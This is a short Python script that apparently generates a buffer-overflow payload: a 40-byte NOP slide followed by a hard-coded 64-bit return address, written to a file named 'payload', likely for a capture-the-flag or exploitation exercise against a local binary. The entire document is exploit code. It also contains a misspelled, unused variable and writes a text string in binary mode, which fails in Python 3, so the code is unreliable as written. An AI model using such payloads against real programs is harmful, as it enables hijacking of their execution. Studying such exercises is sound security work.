playload_length = 40

nop_slide = "\x90" * 40

return_address = "\x46\x11\x40\x00\x00\x00\x00\x00"

load = nop_slide + return_address

f = open("payload", "wb")
f.write(load)